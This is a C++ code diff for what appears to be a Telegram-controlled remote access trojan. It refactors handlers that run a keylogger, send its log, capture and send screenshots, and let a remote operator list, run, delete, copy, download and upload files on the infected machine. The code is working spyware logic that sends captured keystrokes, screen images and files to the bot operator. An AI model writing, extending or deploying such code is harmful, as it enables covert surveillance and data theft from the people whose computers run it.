@@ -73,7 +73,7 @@ void startBot(std::string token)
 		executeIfStandardMode(bot, message, [&](int64_t chat_id) {
 			isKeyLoggerRunning = false;
 			bot.getApi().sendMessage(chat_id, "Killing current key_logger session.");
-			Result result = deleteFile(filename);
+			Result result = deleteFile(klFilename);
 			handleResult(result, bot, chat_id);
 			});
 		});
@@ -81,7 +81,7 @@ void startBot(std::string token)
 
 	bot.getEvents().onCommand("send_key_logger", [&bot](TgBot::Message::Ptr message) {
 		executeIfStandardMode(bot, message, [&](int64_t chat_id) {
-			Result result = sendFile(bot, filename, chat_id);
+			Result result = sendFile(bot, klFilename, chat_id);
 			handleResult(result, bot, chat_id);
 			});
 		});
@@ -90,10 +90,13 @@ void startBot(std::string token)
 	bot.getEvents().onCommand("send_scr", [&bot](TgBot::Message::Ptr message) {
 		executeIfStandardMode(bot, message, [&](int64_t chat_id) {
 			try {
-				takeScreenshot(scrname);
-				Result result = sendFile(bot, wstringToUtf8(scrname), chat_id);
+				char tempPath[MAX_PATH];
+				GetTempPathA(MAX_PATH, tempPath);
+				string tempFile = string(tempPath) + "scrtemp.bmp";
+				takeScreenshot(tempFile);
+				Result result = sendFile(bot, tempFile, chat_id);
 				handleResult(result, bot, chat_id);
-				result = deleteFile(wstringToUtf8(scrname));
+				result = deleteFile(tempFile);
 				handleResult(result, bot, chat_id);
 			}
 			catch (const std::exception& e) {
@@ -217,42 +220,35 @@ void startBot(std::string token)
 		}
 
 
-		Result result;
+		Result result = {COE::Success, "", ResponseType::None, ""}; // default value
 		switch (currentMode) 
 		{
 		case Mode::CHECK_DIR:
 			result = checkDir(message->text);
-			handleResult(result, bot, message->chat->id);
 			break;
 		case Mode::FULL_CHECK_DIR:
 			result = fullCheckDir(message->text);
-			handleResult(result, bot, message->chat->id);
 			break;
 		case Mode::START_FILE:
 			result = startFile(message->text);
-			handleResult(result, bot, message->chat->id);
 			break;
 		case Mode::DELETE_FILE:
 			result = deleteFile(message->text);
-			handleResult(result, bot, message->chat->id);
 			break;
 		case Mode::COPY_FILE:
 			result = copyFile(message->text);
-			handleResult(result, bot, message->chat->id);
 			break;
 		case Mode::SEND_FILE:
 			result = sendFile(bot, message->text, message->chat->id);
-			handleResult(result, bot, message->chat->id);
 			break;
 		case Mode::UPLOAD_FILE:
 			result = uploadFile(bot, message);
-			handleResult(result, bot, message->chat->id);
 			break;
 		case Mode::PLAY_MUSIC:
-			result = playMusic(bot, message);
-			handleResult(result, bot, message->chat->id);
+			result = playMusic(message->text);
 			break;
 		}
+		handleResult(result, bot, message->chat->id);
 		});
 
 
@@ -264,7 +260,7 @@ void startBot(std::string token)
 
 		while (true) {
 			longPoll.start();
-			std::this_thread::sleep_for(std::chrono::milliseconds(100)); // Reduces CPU usage
+			std::this_thread::sleep_for(std::chrono::milliseconds(100)); // Reduces CPU usageы
 		}
 	}
 	catch (TgBot::TgException& e) {
